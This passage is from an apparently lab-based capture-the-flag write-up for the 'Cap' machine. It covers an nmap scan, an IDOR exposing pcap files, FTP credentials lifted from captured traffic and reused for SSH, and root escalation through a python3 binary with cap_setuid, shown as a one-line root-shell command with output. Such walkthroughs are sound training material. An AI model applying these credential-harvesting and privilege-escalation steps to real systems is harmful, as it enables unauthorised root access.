</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.245
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.062s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">21/tcp open  ftp     vsftpd 3.0.3
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp open  http    gunicorn
</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   FourOhFourRequest: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.0 <span class="m">404</span> NOT FOUND
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Server: gunicorn
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Wed, <span class="m">09</span> Jun <span class="m">2021</span> 09:08:25 GMT
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">232</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;!DOCTYPE HTML PUBLIC <span class="s2">&#34;-//W3C//DTD HTML 3.2 Final//EN&#34;</span>&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;title&gt;404 Not Found&lt;/title&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;h1&gt;Not Found&lt;/h1&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>   GetRequest: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.0 <span class="m">200</span> OK
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Server: gunicorn
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Wed, <span class="m">09</span> Jun <span class="m">2021</span> 09:08:19 GMT
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">19386</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;!DOCTYPE html&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;html <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;no-js&#34;</span> <span class="nv">lang</span><span class="o">=</span><span class="s2">&#34;en&#34;</span>&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;head&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span>&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;x-ua-compatible&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;ie=edge&#34;</span>&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;title&gt;Security Dashboard&lt;/title&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;viewport&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;width=device-width, initial-scale=1&#34;</span>&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;shortcut icon&#34;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;image/png&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/images/icon/favicon.ico&#34;</span>&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/bootstrap.min.css&#34;</span>&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/font-awesome.min.css&#34;</span>&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/themify-icons.css&#34;</span>&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/metisMenu.css&#34;</span>&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/owl.carousel.min.css&#34;</span>&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/slicknav.min.css&#34;</span>&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: gunicorn
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Security Dashboard
</span></span><span class="line"><span class="cl"><span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class="line"><span class="cl">SF-Port80-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>6/9%Time<span class="o">=</span>60C08501%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>GetRe
</span></span><span class="line"><span class="cl">SF:quest,2FE5,<span class="s2">&#34;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20W
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">...[SNIP]...
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class="line"><span class="cl"><span class="s2">Nmap done: 1 IP address (1 host up) scanned in 131.73 seconds
</span></span></span></code></pre></div><p>Since <code>nmap</code> didn&rsquo;t show anonymous login in FTP, I will head to the website.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>When I get to the website on port 80, I find that I&rsquo;ve already logged in as Nathan.</p>
<p><div class="img-container"><img src="imgs/image-20210609162151343.png" alt="image-20210609162151343"  /></div>
</p>
<p>There are some menu in the side navigation bar. One menu that I find interesting is the &ldquo;Security Snapshot&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210609162215061.png" alt="image-20210609162215061"  /></div>
</p>
<p>In the &ldquo;Security Snapshot&rdquo; page, there is a download button which gives me a <code>pcap</code> file. Based on the URL, it seems there are 8 pcap files that have been generated so far.</p>
<p><div class="img-container"><img src="imgs/image-20210609162434839.png" alt="image-20210609162434839"  /></div>
</p>
<p>When I open the <code>pcap</code> file, it was empty.</p>
<h4 id="idor">IDOR</h4>
<p>The download URL for pcap file is interesting here, and when I change it to 0, it pops another download prompt.</p>
<p><div class="img-container"><img src="imgs/image-20210609162545619.png" alt="image-20210609162545619"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-nathan">Shell as nathan</h3>
<h4 id="pcap-analysis">Pcap Analysis</h4>
<p>There are quite a lot of traffic captured in this <code>0.pcap</code> file, but if I filter it to only show FTP, it shows that there is an FTP login performed by user <strong>nathan</strong>. Since there is no encryption, I can also see the login password.</p>
<p><div class="img-container"><img src="imgs/image-20210609162111265.png" alt="image-20210609162111265"  /></div>
</p>
<h4 id="ftp-access">FTP access</h4>
<p>Entering <code>nathan:Buck3tH4Tf0RM3</code> logs me in into the FTP server, and I can read the user flag from there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «cap» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ ftp 10.10.10.245
</span></span><span class="line"><span class="cl">Connected to 10.10.10.245.
</span></span><span class="line"><span class="cl"><span class="m">220</span> <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
</span></span><span class="line"><span class="cl">Name <span class="o">(</span>10.10.10.245:root<span class="o">)</span>: nathan
</span></span><span class="line"><span class="cl"><span class="m">331</span> Please specify the password.
</span></span><span class="line"><span class="cl">Password:
</span></span><span class="line"><span class="cl"><span class="m">230</span> Login successful.
</span></span><span class="line"><span class="cl">Remote system <span class="nb">type</span> is UNIX.
</span></span><span class="line"><span class="cl">Using binary mode to transfer files.
</span></span><span class="line"><span class="cl">ftp&gt; ls
</span></span><span class="line"><span class="cl"><span class="m">200</span> PORT <span class="nb">command</span> successful. Consider using PASV.
</span></span><span class="line"><span class="cl"><span class="m">150</span> Here comes the directory listing.
</span></span><span class="line"><span class="cl">-rw-rw-r--    <span class="m">1</span> <span class="m">1001</span>     <span class="m">1001</span>         <span class="m">8088</span> Jun <span class="m">09</span> 08:04 25134.c
</span></span><span class="line"><span class="cl">-rwxrwxr-x    <span class="m">1</span> <span class="m">1001</span>     <span class="m">1001</span>        <span class="m">18360</span> Jun <span class="m">09</span> 08:25 exp
</span></span><span class="line"><span class="cl">-rwxrwxr-x    <span class="m">1</span> <span class="m">1001</span>     <span class="m">1001</span>       <span class="m">342868</span> Jun <span class="m">09</span> 06:24 linpeas.sh
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">3</span> <span class="m">1001</span>     <span class="m">1001</span>         <span class="m">4096</span> Jun <span class="m">09</span> 06:26 snap
</span></span><span class="line"><span class="cl">-r--------    <span class="m">1</span> <span class="m">1001</span>     <span class="m">1001</span>           <span class="m">33</span> Jun <span class="m">09</span> 04:59 user.txt
</span></span><span class="line"><span class="cl"><span class="m">226</span> Directory send OK.
</span></span><span class="line"><span class="cl">ftp&gt; 
</span></span></code></pre></div><h4 id="ssh---nathan">SSH - nathan</h4>
<p>The credentials can also be used for SSH login.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «cap» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ ssh nathan@10.10.10.245
</span></span><span class="line"><span class="cl">nathan@10.10.10.245<span class="err">&#39;</span>s password: 
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 20.04.2 LTS <span class="o">(</span>GNU/Linux 5.4.0-73-generic x86_64<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com
</span></span><span class="line"><span class="cl"> * Management:     https://landscape.canonical.com
</span></span><span class="line"><span class="cl"> * Support:        https://ubuntu.com/advantage
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  System information as of Wed Jun  <span class="m">9</span> 09:35:15 UTC <span class="m">2021</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  System load:           0.0
</span></span><span class="line"><span class="cl">  Usage of /:            35.0% of 8.73GB
</span></span><span class="line"><span class="cl">  Memory usage:          34%
</span></span><span class="line"><span class="cl">  Swap usage:            0%
</span></span><span class="line"><span class="cl">  Processes:             <span class="m">229</span>
</span></span><span class="line"><span class="cl">  Users logged in:       <span class="m">0</span>
</span></span><span class="line"><span class="cl">  IPv4 address <span class="k">for</span> eth0: 10.10.10.245
</span></span><span class="line"><span class="cl">  IPv6 address <span class="k">for</span> eth0: dead:beef::250:56ff:feb9:f2f1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="o">=</span>&gt; There are <span class="m">4</span> zombie processes.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Last login: Wed Jun  <span class="m">9</span> 08:53:04 <span class="m">2021</span> from 10.10.16.15
</span></span><span class="line"><span class="cl">nathan@cap:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>nathan<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>nathan<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>nathan<span class="o">)</span>
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="web-source-code">Web source code</h4>
<p>With shell access, I went to the web directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nathan@cap:/var/www/html$ ls -l
</span></span><span class="line"><span class="cl">total <span class="m">24</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> nathan nathan <span class="m">4096</span> May <span class="m">27</span> 09:10 __pycache__
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> nathan nathan <span class="m">4293</span> Jun  <span class="m">9</span> 10:19 app.py
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">6</span> root   root   <span class="m">4096</span> May <span class="m">23</span> 19:17 static
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root   root   <span class="m">4096</span> May <span class="m">23</span> 19:17 templates
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root   root   <span class="m">4096</span> Jun  <span class="m">9</span> 10:12 upload
</span></span><span class="line"><span class="cl">nathan@cap:/var/www/html$ 
</span></span></code></pre></div><p>Looking at the source code, I see one interesting line code in a variable called <code>command</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
</span></span><span class="line"><span class="cl"><span class="o">...&lt;</span><span class="n">SNIP</span><span class="o">&gt;...</span>
</span></span><span class="line"><span class="cl"><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&#34;/capture&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nd">@limiter</span><span class="o">.</span><span class="n">limit</span><span class="p">(</span><span class="s2">&#34;10 per minute&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">capture</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">get_lock</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">pcapid</span> <span class="o">=</span> <span class="n">get_appid</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">increment_appid</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">release_lock</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">root_path</span><span class="p">,</span> <span class="s2">&#34;upload&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">pcapid</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;.pcap&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">ip</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">remote_addr</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># permissions issues with gunicorn and threads. hacky solution for now.</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#os.setuid(0)</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#command = f&#34;timeout 5 tcpdump -w {path} -i any host {ip}&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;&#34;&#34;python3 -c &#39;import os; os.setuid(0); os.system(&#34;timeout 5 tcpdump -w </span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2"> -i any host </span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s2">&#34;)&#39;&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#os.setuid(1000)</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span><span class="p">[</span><span class="n">SNIP</span><span class="p">]</span><span class="o">...</span>
</span></span></code></pre></div><h4 id="linux-capabilities">Linux Capabilities</h4>
<p>When I examine the running process, the web server is currently running as <code>nathan</code>, so <code>os.setuid(0)</code> shouldn&rsquo;t be possible, except the binary has a <code>CAP SETUID</code> <a href="https://gtfobins.github.io/gtfobins/python/#capabilities">capability set</a>.</p>
<p><div class="img-container"><img src="imgs/image-20210609174520024.png" alt="image-20210609174520024"  /></div>
</p>
<p>A quick check on the Python binary shows that it has the <code>cap_setuid</code> set.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nathan@cap:/var/www/html$ ls -l <span class="k">$(</span>which python3<span class="k">)</span>
</span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> root root <span class="m">9</span> Mar <span class="m">13</span>  <span class="m">2020</span> /usr/bin/python3 -&gt; python3.8
</span></span><span class="line"><span class="cl">nathan@cap:/var/www/html$ ls -l <span class="k">$(</span>which python3.8<span class="k">)</span>
</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">5486384</span> Jan <span class="m">27</span> 15:41 /usr/bin/python3.8
</span></span><span class="line"><span class="cl">nathan@cap:/var/www/html$ getcap /usr/bin/python3.8
</span></span><span class="line"><span class="cl">/usr/bin/python3.8 <span class="o">=</span> cap_setuid,cap_net_bind_service+eip
</span></span></code></pre></div><p>So I can escalate myself to root with <code>python3 -c 'import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)'</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nathan@cap:/var/www/html$ python3 -c <span class="s1">&#39;import os; os.setuid(0); os.system(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">root@cap:/var/www/html# id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>nathan<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>nathan<span class="o">)</span>
</span></span><span class="line"><span class="cl">root@cap:/var/www/html# <span class="nb">cd</span> /root/
</span></span><span class="line"><span class="cl">root@cap:/root# ls -l
</span></span><span class="line"><span class="cl">total <span class="m">8</span>
</span></span><span class="line"><span class="cl">-r-------- <span class="m">1</span> root root   <span class="m">33</span> Jun  <span class="m">9</span> 04:59 root.txt
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root root <span class="m">4096</span> May <span class="m">23</span> 19:17 snap
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
  </channel>
</rss>
